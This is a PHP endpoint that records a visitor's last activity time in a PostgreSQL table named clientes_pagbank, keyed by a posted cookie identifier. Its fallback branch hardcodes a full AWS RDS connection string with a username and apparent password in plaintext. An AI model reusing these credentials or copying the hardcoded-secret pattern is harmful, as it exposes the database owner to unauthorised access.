<?php
// Tenta obter a URL do banco de dados do ambiente (Heroku)
$DATABASE_URL = getenv("DATABASE_URL");

if (!$DATABASE_URL) {
    // Se não estiver no Heroku, use as credenciais locais
    $DATABASE_URL = "host=cd7f19r8oktbkp.cluster-czrs8kj4isg7.us-east-1.rds.amazonaws.com port=5432 dbname=de3nhd2osd4jko user=u974ongr8md5qc password=p68932741a8bb7b2b28fced15dae4143f8721c875a7dfa625405c09b198d9c632";
}

$db = pg_connect($DATABASE_URL);

if (!$db) {
    http_response_code(503);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Serviço indisponível.']);
    exit;
}

if (isset($_POST['identificador_cookie'])) {

    $cookie = $_POST['identificador_cookie'];

    // --- ✨ CORREÇÃO PRINCIPAL ESTÁ AQUI ✨ ---
    // Cria um objeto DateTime com o tempo atual, explicitamente na zona UTC.
    $now_utc = new DateTime('now', new DateTimeZone('UTC'));

    // Formata para o padrão ISO 8601, que o PostgreSQL entende perfeitamente.
    // O resultado será algo como "2025-10-15 18:35:00+00:00"
    $now_formatted = $now_utc->format('Y-m-d H:i:sP');

    // A query para atualizar o banco
    $query = "UPDATE clientes_pagbank SET last_active_at = $1 WHERE identificador_cookie = $2";

    // Os parâmetros com a data formatada corretamente
    $params = [$now_formatted, $cookie];

    $result = pg_query_params($db, $query, $params);

    if ($result) {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success']);
    } else {
        header('Content-Type: application/json');
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Falha ao atualizar o status do cliente.']);
    }

} else {
    header('Content-Type: application/json');
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Cookie identifier not provided.']);
}
?>